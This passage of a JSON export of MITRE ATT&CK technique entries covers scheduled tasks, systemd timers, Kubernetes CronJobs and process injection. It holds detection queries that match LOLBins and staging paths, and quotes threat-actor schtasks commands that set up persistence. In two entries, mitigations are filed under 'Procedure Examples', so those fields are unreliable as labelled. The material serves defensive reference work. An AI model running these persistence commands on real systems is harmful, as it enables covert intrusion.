LIKE '%powershell%' OR JobContent LIKE '%wmic%' OR   JobContent LIKE '%rundll32%' OR JobContent LIKE '%cmd%' OR   JobContent LIKE '%cscript%' OR JobContent LIKE '%wscript%' OR   JobContent LIKE '%regsvr32%' OR JobContent LIKE '%mshta%' OR   JobContent LIKE '%bitsadmin%' OR JobContent LIKE '%certutil%' OR   JobContent LIKE '%msiexec%' OR JobContent LIKE '%javaw%' OR   JobContent LIKE '%[%]APPDATA[%]%' OR JobContent LIKE '%\\AppData\\Roaming%' OR   JobContent LIKE '%[%]PUBLIC[%]%' OR JobContent LIKE '%C:\\Users\\Public%' OR   JobContent LIKE '%[%]ProgramData[%]%' OR JobContent LIKE '%C:\\ProgramData%' OR   JobContent LIKE '%[%]TEMP[%]%' OR JobContent LIKE '%\\AppData\\Local\\Temp%' OR   JobContent LIKE '%\\Windows\\PLA\\System%' OR JobContent LIKE '%\\tasks%' OR   JobContent LIKE '%\\Registration\\CRMLog%' OR JobContent LIKE '%\\FxsTmp%' OR   JobContent LIKE '%\\spool\\drivers\\color%' OR JobContent LIKE '%\\tracing%')",
      "Monitor for newly constructed registry keys upon creation of new task. Deletion of values/keys in the registry may further indicate malicious activity.Analytic 1 - Suspicious Creations under Schedule Registry Key((source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"12\") OR (sourcetype=WinEventLog:Security EventCode=4657) | search (registry_path=\"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\\" OR registry_path=\"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\*\")"
    ],
    "Procedure Examples": [
      "During the2022 Ukraine Electric Power Attack,Sandworm Teamleveraged Scheduled Tasks through a Group Policy Object (GPO) to executeCaddyWiperat a predetermined time.[7]",
      "Agent Teslahas achieved persistence via scheduled tasks.[8]",
      "Anchorcan create a scheduled task for persistence.[9]",
      "Apostleachieves persistence by creating a scheduled task, such asMicrosoftCrashHandlerUAC.[10]",
      "AppleJeushas created a scheduled SYSTEM task that runs when a user logs in.[11]",
      "APT-C-36has used a macro function to set scheduled tasks, disguised as those used by Google.[12]",
      "APT29has used named and hijacked scheduled tasks to establish persistence.[13]",
      "AnAPT3downloader creates persistence by creating the following scheduled task:schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\".[14]",
      "APT32has used scheduled tasks to persist on victim systems.[15][16][17][18]",
      "APT33has created a scheduled task to execute a .vbe file multiple times a day.[19]",
      "APT37has created scheduled tasks to run malicious scripts on a compromised host.[20]",
      "APT38has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence.[21]Additionally,APT38has used living-off-the-land scripts to execute a malicious script via a scheduled task.[22]",
      "APT39has created scheduled tasks for persistence.[23][24][25]",
      "APT41used a compromised account to create a scheduled task on a system.[26][27]",
      "APT42has used scheduled tasks for persistence.[28]",
      "AsyncRATcan create a scheduled task to maintain persistence on system start-up.[29]",
      "Attor's installer plugin can schedule a new task that loads the dispatcher on boot/logon.[30]",
      "BabySharkhas used scheduled tasks to maintain persistence.[27]",
      "BackConfighas the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host.[31]",
      "Bad Rabbit’sinfpub.datfile creates a scheduled task to launch a malicious executable.[32]",
      "BADHATCHcan useschtasks.exeto gain persistence.[33]",
      "BADNEWScreates a scheduled task to establish by executing a malicious payload every subsequent minute.[34]",
      "Bazarcan create a scheduled task for persistence.[35][36]",
      "BITTERhas used scheduled tasks for persistence and execution.[37]",
      "BlackBytecreated scheduled tasks for payload execution.[38][39]",
      "BlackByte Ransomwarecreates a schedule task to execute remotely deployed ransomware payloads.[40]",
      "Blue Mockingbirdhas used Windows Scheduled Tasks to establish persistence on local and remote hosts.[41]",
      "BONDUPDATERpersists using a scheduled task that executes every minute.[42]",
      "BRONZE BUTLERhas usedschtasksto register a scheduled task to execute malware during lateral movement.[43]",
      "Bumblebeecan achieve persistence by copying its DLL to a subdirectory of %APPDATA% and creating a Visual Basic Script that will load the DLL via a scheduled task.[44][45]",
      "DuringC0017,APT41used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks:\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor,\\Microsoft\\Windows\\Ras\\ManagerMobility,\\Microsoft\\Windows\\WDI\\SrvSetupResults, and\\Microsoft\\Windows\\WDI\\USOShared.[46]",
      "During theC0032campaign,TEMP.Velesused scheduled task XML triggers.[47]",
      "Carboncreates several tasks for later execution to continue persistence on the victim’s machine.[48]",
      "ccf32can run on a daily basis using a scheduled task.[49]",
      "Chimerahas used scheduled tasks to invoke Cobalt Strike including through batch scriptschtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /stand to maintain persistence.[50][51]",
      "CHIMNEYSWEEPcan use the WindowsSilentCleanupscheduled task to enable payload execution.[52]",
      "Cobalt Grouphas created Windows tasks to establish persistence.[53]",
      "ComRAThas used a scheduled task to launch its PowerShell loader.[54][55]",
      "Confuciushas created scheduled tasks to maintain persistence on a compromised host.[56]",
      "CosmicDukeuses scheduled tasks typically named \"Watchmon Service\" for persistence.[57]",
      "DuringCostaRicto, the threat actors used scheduled tasks to download backdoor tools.[58]",
      "One persistence mechanism used byCozyCaris to register itself as a scheduled task.[59]",
      "Crutchhas the ability to persist using scheduled tasks.[60]",
      "CSPY Downloadercan use the schtasks utility to bypass UAC.[61]",
      "Daggerflyhas attempted to use scheduled tasks for persistence in victim environments.[62]",
      "DanBotcan use a scheduled task for installation.[63]",
      "DarkWatchmanhas created a scheduled task for persistence.[64]",
      "Discocan create a scheduled task to run every minute for persistence.[65]",
      "Dragonflyhas used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.[66]",
      "Dridexcan maintain persistence via the creation of scheduled tasks within system directories such aswindows\\system32\\,windows\\syswow64,winnt\\system32, andwinnt\\syswow64.[67]",
      "Adversaries can instructDuquto spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[68]",
      "Dyrehas the ability to achieve persistence by adding a new task in the task scheduler to run every minute.[69]",
      "Ember Bearuses remotely scheduled tasks to facilitate remote command execution on victim machines.[70]",
      "Emotethas maintained persistence through a scheduled task, e.g. though a .dll file in the Registry.[71][72]",
      "Empirehas modules to interact with the Windows task scheduler.[73]",
      "EvilBunnyhas executed commands via scheduled tasks.[74]",
      "FIN10has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.[75][73]",
      "FIN13has created scheduled tasks in theC:\\Windowsdirectory of the compromised network.[76]",
      "FIN6has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD andFrameworkPOS.[77]",
      "FIN7malware has created scheduled tasks to establish persistence.[78][79][80][81]",
      "FIN8has used scheduled tasks to maintain RDP backdoors.[82]",
      "Fox Kittenhas used Scheduled Tasks for persistence and to load and execute a reverse proxy binary.[83][84]",
      "DuringFrankenstein, the threat actors established persistence through a scheduled task using the command:/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR, named \"WinUpdate\"[85]",
      "GALLIUMestablished persistence forPoisonIvyby created a scheduled task.[86]",
      "Gamaredon Grouphas created scheduled tasks to launch executables after a designated number of minutes have passed.[87][88][89][90]",
      "Gazercan establish persistence by creating a scheduled task.[91][92]",
      "GoldMaxhas used scheduled tasks to maintain persistence.[93]",
      "Goopyhas the ability to maintain persistence by creating scheduled tasks set to run every hour.[17]",
      "GravityRATcreates a scheduled task to ensure it is re-executed everyday.[94]",
      "GRIFFONhas usedsctasksfor persistence.[95]",
      "GrimAgenthas the ability to set persistence using the Task Scheduler.[96]",
      "Helminthhas used a scheduled task for persistence.[97]",
      "HermeticWiperhas the ability to use scheduled tasks for execution.[98]",
      "HEXANEhas used a scheduled task to establish persistence for a keylogger.[99]",
      "Higaisadropped and addedofficeupdate.exeto scheduled tasks.[100][101]",
      "HotCroissanthas attempted to install a scheduled task named \"Java Maintenance64\" on startup to establish persistence.[102]",
      "IcedIDhas created a scheduled task to establish persistence.[103][104][105]",
      "IMAPLoadercreates scheduled tasks for persistence based on the operating system version of the victim machine.[106]",
      "InvisiMolehas used scheduled tasks namedMSSTand\\Microsoft\\Windows\\Autochk\\Scheduledto establish persistence.[107]",
      "IronNetInjectorhas used a task XML file namedmssch.xmlto run an IronPython script when a user logs in or when specific system events are created.[108]",
      "ISMInjectorcreates scheduled tasks to establish persistence.[109]",
      "JHUHUGIThas registered itself as a scheduled task to run each time the current user logs in.[110][111]",
      "JSS Loaderhas the ability to launch scheduled tasks to establish persistence.[112]",
      "DuringJuicy Mix,OilRigused VBS droppers to schedule tasks for persistence.[113]",
      "Kapekapersists via scheduled tasks.[114][115]",
      "Kimsukyhas downloaded additional malware with scheduled tasks.[116]",
      "Koadichas used scheduled tasks to add persistence.[117]",
      "Latrodectuscan create scheduled tasks for persistence.[118][119][120]",
      "Lazarus Grouphas usedschtasksfor persistence including through the periodic execution of a remote XSL script or a dropped VBS payload.[121][122]",
      "LitePowercan create a scheduled task to enable persistence mechanisms.[123]",
      "LockBit 2.0can be executed via scheduled task.[124]",
      "Lokibotembedded the commandsschtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /Iinside a batch script.[125]",
      "Luciferhas established persistence by creating the following scheduled taskschtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F.[126]",
      "LuminousMothhas created scheduled tasks to establish persistence for their tools.[127]",
      "The different components ofMacheteare executed by Windows Task Scheduler.[128][129]",
      "Machetehas created scheduled tasks to maintainMachete's persistence.[130]",
      "Magic Houndhas used scheduled tasks to establish persistence and execution.[131][132]",
      "MagicRATcan persist via scheduled tasks.[133]",
      "Mangocan create a scheduled task to run every 32 seconds to communicate with C2 and execute received commands.[113]",
      "Matryoshkacan establish persistence by adding a Scheduled Task named \"Microsoft Boost Kernel Optimization\".[134][135]",
      "Mazehas created scheduled tasks using name variants such as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\", to launchMazeat a specific time.[136]",
      "MCMDcan use scheduled tasks for persistence.[137]",
      "menuPasshas used a script (atexec.py) to execute a command on a target machine via Task Scheduler.[138]",
      "Meteorexecution begins from a scheduled task namedMicrosoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeAlland it creates a separate scheduled task calledmstaskto run the wiper only once at 23:55:00.[139]",
      "Milancan establish persistence on a targeted host with scheduled tasks.[140][141]",
      "Moleratshas created scheduled tasks to persistently run VBScripts.[142]",
      "Moonstone Sleetused scheduled tasks for program execution during initial access to victim machines.[143]",
      "MuddyWaterhas used scheduled tasks to establish persistence.[144]",
      "MultiLayer Wipercreates a malicious scheduled task that launches a batch file to remove Windows Event Logs.[145]",
      "Mustang Pandahas created a scheduled task to execute additional malicious software, as well as maintain persistence.[146][147][148]",
      "Naikonhas used schtasks.exe for lateral movement in compromised networks.[149]",
      "NETWIREcan create a scheduled task to establish persistence.[150]",
      "Nightdooruses scheduled tasks for persistence to load the final malware payload into memory.[151]",
      "NotPetyacreates a task to reboot the system one hour after infection.[152]",
      "OilRighas created scheduled tasks that run a VBScript to execute a payload on victim machines.[153][154][155][156]",
      "Okrum's installer can attempt to achieve persistence by creating a scheduled task.[157]",
      "OopsIEcreates a scheduled task to run itself every three minutes.[153][158]",
      "DuringOperation CuckooBees, the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command:SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.[159]",
      "DuringOperation Dream Job,Lazarus Groupcreated scheduled tasks to set a periodic execution of a remote XSL script.[160]",
      "DuringOperation Wocao, threat actors used scheduled tasks to execute malicious PowerShell code on remote systems.[161]",
      "APatchworkfile stealer can run a TaskScheduler DLL to add persistence.[162]",
      "PowerSploit'sNew-UserPersistenceOptionPersistence argument can be used to establish via aScheduled Task/Job.[163][164]",
      "POWERSTATShas established persistence through a scheduled task using the command\"C:\\Windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR \"c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe\".[165]",
      "POWRUNERpersists through a scheduled task that executes it every minute.[166]",
      "Prestigehas been executed on a target system through a scheduled task created bySandworm TeamusingImpacket.[167]",
      "Pteranodonschedules tasks to invoke its components in order to establish persistence.[168][169]",
      "QakBothas the ability to create scheduled tasks for persistence.[170][171][172][173][174][175][176][177]",
      "QUADAGENTcreates a scheduled task to maintain persistence on the victim’s machine.[154]",
      "QuasarRATcontains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.[178][179]",
      "RainyDaycan use scheduled tasks to achieve persistence.[149]",
      "Ramsaycan schedule tasks via the Windows COM API to maintain persistence.[180]",
      "Rancorlaunched a scheduled task to gain persistence using theschtasks /create /sccommand.[181]",
      "RedCurlhas created scheduled tasks for persistence.[182][183][184]",
      "Remexiutilizes scheduled tasks as a persistence mechanism.[185]",
      "RemoteCMDcan execute commands remotely by creating a new schedule task on the remote system[186]",
      "Revenge RATschedules tasks to run malicious scripts at different intervals.[187]",
      "RTMtries to add a scheduled task to establish persistence.[188][189]",
      "Ryukcan remotely create a scheduled task to execute itself on a system.[190]",
      "Saint Bothas created a scheduled task named \"Maintenance\" to establish persistence.[191]",
      "Sandworm Teamleveraged SHARPIVORY, a .NET dropper that writes embedded payload to disk and uses scheduled tasks to persist on victim machines.[192]",
      "schtasksis used to schedule tasks on a Windows system to run at a specific date and time.[193]",
      "ServHelpercontains modules that will useschtasksto carry out malicious operations.[194]",
      "Shamooncopies an executable payload to the target system by usingSMB/Windows Admin Sharesand then scheduling an unnamed task to execute the malware.[195][196]",
      "SharpDiscocan create scheduled tasks to execute reverse shells that read and write data to and from specified SMB shares.[65]",
      "SharpStagehas a persistence component to write a scheduled task for the payload.[197]",
      "Sibothas been executed via a scheduled task.[93]",
      "Silencehas used scheduled tasks to stage its operation.[198]",
      "Smoke Loaderlaunches a scheduled task.[199]",
      "Solarcan create scheduled tasks named Earth and Venus, which run every 30 and 40 seconds respectively, to support C2 and exfiltration.[113]",
      "During theSolarWinds Compromise,APT29usedschedulerandschtasksto create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.APT29also created a scheduled task to maintainSUNSPOTpersistence when the host booted.[200][201][202]",
      "SoreFangcan gain persistence through use of scheduled tasks.[203]",
      "Spicahas created a scheduled task namedCalendarCheckerto establish persistence.[204]",
      "SQLRathas created scheduled tasks in%appdata%\\Roaming\\Microsoft\\Templates\\.[81]",
      "Stealth Falconmalware creates a scheduled task entitled \"IE Web Cache\" to execute a malicious file hourly.[205]",
      "Stuxnetschedules a network job to execute two minutes after host infection.[206]",
      "SUGARDUMPhas created scheduled tasks calledMicrosoftInternetExplorerCrashRepoeterTaskMachineUAandMicrosoftEdgeCrashRepoeterTaskMachineUA, which were configured to executeCrashReporter.exeduring user logon.[207]",
      "SVCReadycan create a scheduled task namedRecoveryExTaskto gain persistence.[208]",
      "TA2541has used scheduled tasks to establish persistence for installed tools.[209]",
      "Tarraskis able to create \"hidden\" scheduled tasks for persistence.[5]",
      "ToddyCathas used scheduled tasks to execute discovery commands and scripts for collection.[210]",
      "Tomirishas usedSCHTASKS /CREATE /SC DAILY /TN StartDVL /TR \"[path to self]\" /ST 10:00to establish persistence.[211]",
      "TrickBotcreates a scheduled task on the system that provides persistence.[212][213][214]",
      "In theTriton Safety Instrumented System Attack,TEMP.Velesinstalled scheduled tasks defined in XML files.[215]",
      "Valakhas used scheduled tasks to execute additional payloads and to gain persistence on a compromised host.[216][217][218]",
      "Winter Vivernexecuted PowerShell scripts that would subsequently attempt to establish persistence by creating scheduled tasks objects to periodically retrieve and execute remotely-hosted payloads.[219]",
      "Wizard Spiderhas used scheduled tasks to establish persistence forTrickBotand other malware.[220][221][222][223][224]",
      "XLoadercan create scheduled tasks for persistence.[225]",
      "ytyestablishes persistence by creating a scheduled task with the commandSchTasks /Create /SC DAILY /TN BigData /TR \" + path_file + \"/ST 09:30\".[226]",
      "Zebrocyhas a command to create a scheduled task for persistence.[227]",
      "zwShellhas used SchTasks for execution.[228]",
      "ZxxZhas used scheduled tasks for persistence and execution.[37]"
    ]
  },
  "T1053.006": {
    "Name": "Scheduled Task/Job:Systemd Timers",
    "Description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension.timerthat control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative toCronin Linux environments.[1]Systemd timers may be activated remotely via thesystemctlcommand line utility, which operates overSSH.[2]Each.timerfile must have a corresponding.servicefile with the same name, e.g.,example.timerandexample.service..servicefiles areSystemd Serviceunit files that are managed by the systemd system and service manager.[3]Privileged timers are written to/etc/systemd/system/and/usr/lib/systemd/systemwhile user level are written to~/.config/systemd/user/.An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.[4][5][6]Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.[7]",
    "Detects": [
      "Monitor executed commands and arguments the 'systemd-run' utility as it may be used to create timers.Analytic 1 - Look for systemd-run execution with arguments indicative of timer creation.sourcetype=linux_logs (command=\"systemctl\" OR command=\"systemd-run\")",
      "Monitor for changes made to systemd timer unit files for unexpected modification events within the /etc/systemd/system, /usr/lib/systemd/system/, and ~/.config/systemd/user/ directories, as well as associated symbolic links.Analytic 1 - Look for systemd timer file modifications with unusual parameters.sourcetype=linux_file_audit (file_path=\"/etc/systemd/system/.timer\" OR file_path=\"/etc/systemd/system/.service\" OR file_path=\"~/.config/systemd/user/.timer\" OR file_path=\"/usr/lib/systemd/system/.timer\")| stats count by user host file_path action| where action=\"Create\" OR action=\"Write\"",
      "Monitor for newly constructed processes and/or command-lines that will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.Note: This query looks for processes spawned by systemd (parent process systemd, with a PID of 1). These processes should be examined for anomalous behavior, particularly when running as the root user.Analytic 1 - Look for processes with parent process systemdand unusual parameters.sourcetype=linux_process_creation parent_process_name=\"systemd\"",
      "Suspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: systemctl list-timers –all. Analyze the contents of corresponding .service files present on the file system and ensure that they refer to legitimate, expected executables.Analytic 1 - Look for systemd timer creation events with unusual parameters.sourcetype=linux_logs (command=\"systemctl start.timer\" OR command=\"systemctl enable.timer\" OR command=\"systemctl daemon-reload\")"
    ],
    "Procedure Examples": [
      "Limit access to the root account and prevent users from creating and/or modifying systemd timer unit files.",
      "Restrict read/write access to systemd.timerunit files to only select privileged users who have a legitimate need to manage system services.",
      "Limit user access to system utilities such as 'systemctl' or 'systemd-run' to users who have a legitimate need."
    ]
  },
  "T1053.007": {
    "Name": "Scheduled Task/Job:Container Orchestration Job",
    "Description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.[1][2]An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.[3]",
    "Detects": [
      "Monitor for container creation events within Kubernetes clusters. This helps track when new containers are being deployed, especially by jobs that could have been scheduled by adversaries.Analytic 1 - Look for new container creation events with unusual parameters.sourcetype=kubernetes:container_creation | stats count by container_name namespace pod_name container_id image_name| where NOT [search index=container_baseline container_name=* earliest=-30d@d latest=now() | table container_name]",
      "Monitor for newly constructed files by using the logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application and resource pods to monitor malicious container orchestration job deployments.Note: This query monitors for .yaml configuration files that are used to define jobs and container behaviors within Kubernetes. Changes or creations of these files should be closely watched.Analytic 1 - Look for new file creation events with unusual parameters.sourcetype=kubernetes:file_creation file_path=\"/etc/kubernetes/manifests/*.yaml\"",
      "Monitor for Kubernetes CronJob or Job creation using Kubernetes API or CLI commands.Note: This query tracks job creation using kubectl commands or Kubernetes API calls to create or apply CronJobs. It filters out legitimate job creation based on a baseline and identifies unusual CronJob creation or usage.Analytic 1 - Look for new container job creation events with unusual parameters.sourcetype=kubernetes:job_creation (command=\"kubectl create cronjob\" OR command=\"kubectl apply -f.yaml\" OR api_call=\"BatchV1.CronJob.create\")Note: This query monitors Kubernetes events for job creation, start, and completion. These events are useful for tracking the actual execution of scheduled tasks in the cluster.Analytic 2 - Monitoring Kubernetes Events for Job Executionsourcetype=kubernetes:event type=\"Normal\" (reason=\"SuccessfulCreate\" OR reason=\"Started\" OR reason=\"Completed\")"
    ],
    "Procedure Examples": [
      "Ensure containers are not running as root by default. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers.[4]",
      "Limit privileges of user accounts and remediate privilege escalation vectors so only authorized administrators can create container orchestration jobs."
    ]
  },
  "T1055": {
    "Name": "Process Injection",
    "Description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
    "Detects": [
      "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc.",
      "Monitor for changes made to files that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.",
      "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such asCreateRemoteThread,SuspendThread/SetThreadContext/ResumeThread,QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such asVirtualAllocEx/WriteProcessMemory, may be used for this technique.[95]Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.[96][97][98][99]",
      "Monitor for processes being viewed that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges.",
      "Monitor for process memory inconsistencies, such as checking memory ranges against a known copy of the legitimate module.[100]",
      "Monitor for changes made to processes that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm TeamloadedBlackEnergyinto svchost.exe, which then launched iexplore.exe for their C2.[1]",
      "ABKhas the ability to inject shellcode into svchost.exe.[2]",
      "Agent Teslacan inject into known, vulnerable binaries on targeted hosts.[3]",
      "ANDROMEDAcan inject into thewuauclt.exeprocess to perform C2 actions.[4]",
      "APT32malware has injected a Cobalt Strike beacon into Rundll32.exe.[5]",
      "APT37injects its malware variant,ROKRAT, into the cmd.exe process.[6]",
      "APT38has injected malicious payloads into theexplorer.exeprocess.[7]",
      "APT41malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.[8]",
      "APT5has used the CLEANPULSE utility to insert command line strings into a targeted process to alter its functionality.[9]",
      "ArcaneDoorincluded injecting code into the AAA and Crash Dump processes on infected Cisco ASA devices.[10]",
      "Attor's dispatcher can inject itself into running processes to gain higher privileges and to evade detection.[11]",
      "AuditCredcan inject code from files to other running processes.[12]",
      "Avengerhas the ability to inject shellcode into svchost.exe.[2]",
      "Backdoor.Oldreainjects itself into explorer.exe.[13][14]",
      "BADHATCHcan inject itself into an existing explorer.exe process by usingRtlCreateUserThread.[15][16]",
      "Bazarcan inject code through callingVirtualAllocExNuma.[17]",
      "BBKhas the ability to inject shellcode into svchost.exe.[2]",
      "BlackBytehas injectedCobalt Strikeintowuauclt.exeduring intrusions.[18]BlackBytehas injected ransomware intosvchost.exebefore encryption.[19]",
      "BlackByte 2.0 Ransomwareinjects into a newly-createdsvchost.exeprocess prior to device encryption.[20]",
      "Bumblebeecan inject code into multiple processes on infected endpoints.[21]",
      "Cardinal RATinjects into a newly spawned process created from a native Windows executable.[22]",
      "Clamblingcan inject into thesvchost.exeprocess for execution.[23]",
      "COATHANGERincludes a binary labeledauthdthat can inject a library into a running process and then hook an existing function within that process with a new function from that library.[24]",
      "Cobalt Grouphas injected code into trusted processes.[25]",
      "Cobalt Strikecan inject a variety of payloads into processes dynamically chosen by the adversary.[26][27][28]",
      "CostaBrickscan inject a payload into the memory of a compromised host.[29]",
      "DuringCutting Edge, threat actors used malicious SparkGateway plugins to inject shared objects into web process memory on compromised Ivanti Secure Connect VPNs to enable deployment of backdoors.[30]",
      "Donutincludes a subprojectDonutTestto inject shellcode into a target process.[31]",
      "DUSTTRAPcompromises the.textsection of a legitimate system DLL in%windir%to hold the contents of retrieved plug-ins.[32]",
      "Dyrehas the ability to directly inject its code into the web browser process.[33]",
      "Egregorcan inject its payload into iexplore.exe process.[34]",
      "Empirecontains multiple modules for injecting into processes, such asInvoke-PSInject.[35]",
      "Gazerinjects its communication module into an Internet accessible process through which it performs C2.[36][37]",
      "gh0st RATcan inject malicious code into process created by the \"Command_Create&Inject\" function.[38]",
      "GuLoaderhas the ability to inject shellcode into a donor processes that is started in a suspended state.GuLoaderhas previously used RegAsm as a donor process.[39]",
      "HOPLIGHThas injected into running processes.[40]",
      "HTRANcan inject into into running processes.[41]",
      "HyperBrocan run shellcode it injects into a newly created process.[42]",
      "InvisiMolecan inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.[43]",
      "IronNetInjectorcan use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.[44]",
      "JHUHUGITperforms code injection injecting its own functions to browser processes.[45][46]",
      "JPINcan inject content into lsass.exe to load a module.[47]",
      "Kimsukyhas used Win7Elevate to inject malicious code into explorer.exe.[48]",
      "Lizarcan migrate the loader into another process.[49]",
      "metaMaincan inject the loader file, Speech02.db, into a process.[50]",
      "Mis-Typehas been injected directly into a running process, includingexplorer.exe.[51]",
      "Mispadu's binary is injected into memory viaWriteProcessMemory.[52][53]",
      "NavRATcopies itself into a running Internet Explorer process to evade detection.[54]",
      "NETWIREcan inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.[55]",
      "Ninjahas the ability to inject an agent module into a new process and arbitrary shellcode into running processes.[56][57]",
      "DuringOperation Sharpshooter, threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.[58]",
      "DuringOperation Wocao, threat actors injected code into a selected process, which in turn launches a command as a child process of the original.[59]",
      "Pandoracan start and inject code into a newsvchostprocess.[60]",
      "ThePcSharepayload has been injected into thelogagent.exeandrdpclip.exeprocesses.[61]",
      "PLATINUMhas used various methods of process injection including hot patching.[47]",
      "PoshC2contains multiple modules for injecting into processes, such asInvoke-PSInject.[62]",
      "QakBotcan inject itself into processes including explore.exe, Iexplore.exe, Mobsync.exe., and wermgr.exe.[63][64][65][66][67]",
      "Remcoshas a command to hide itself through injecting into another process.[68]",
      "REvilcan inject itself into running processes on a compromised host.[69]",
      "ROKRATcan useVirtualAlloc,WriteProcessMemory, and thenCreateRemoteThreadto execute shellcode within the address space ofNotepad.exe.[70]",
      "Ryukhas injected itself into remote processes to encrypt files using a combination ofVirtualAlloc,WriteProcessMemory, andCreateRemoteThread.[71]",
      "ShadowPadhas injected an install module into a newly created process.[72]",
      "Silencehas injected a DLL library containing a Trojan into the fwmain32.exe process.[73]",
      "SILENTTRINITYcan inject shellcode directly into Excel.exe or a specific process.[74]",
      "Sliverincludes multiple methods to perform process injection to migrate the framework into other, potentially privileged processes on the victim machine.[75][76][77][78]",
      "SLOTHFULMEDIAcan inject into running processes on a compromised host.[79]",
      "Smoke Loaderinjects into the Internet Explorer process.[80]",
      "StoneDrillhas relied on injecting its payload directly into the process memory of the victim's preferred browser.[81]",
      "TA2541has injected malicious code into legitimate .NET related processes including  regsvcs.exe, msbuild.exe, and installutil.exe.[82][83]",
      "TrickBothas usedNt*Native APIfunctions to inject code into legitimate processes such aswermgr.exe.[84]",
      "TSCookiehas the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.[85]",
      "Turlahas also usedPowerSploit'sInvoke-ReflectivePEInjection.ps1to reflectively load a PowerShell payload into a random process on the victim system.[86]",
      "Velvet Antinitial execution included launching multiplesvchostprocesses and injecting code into them.[87]",
      "WarzoneRAThas the ability to inject malicious DLLs into a specific process for privilege escalation.[88]",
      "Waterbearcan inject decrypted shellcode into the LanmanServer service.[89]",
      "Wiarpcreates a backdoor through which remote attackers can inject files into running processes.[90]",
      "Wingbirdperforms multiple process injections to hijack system processes and execute malicious code.[91]",
      "Wizard Spiderhas used process injection to execute payloads to escalate privileges.[92]",
      "Woody RATcan inject code into a targeted process by writing to the remote memory of an infected system and then create a remote thread.[93]"
    ]
  },
  "T1055.001": {
    "Name": "Process Injection:Dynamic-link Library Injection",
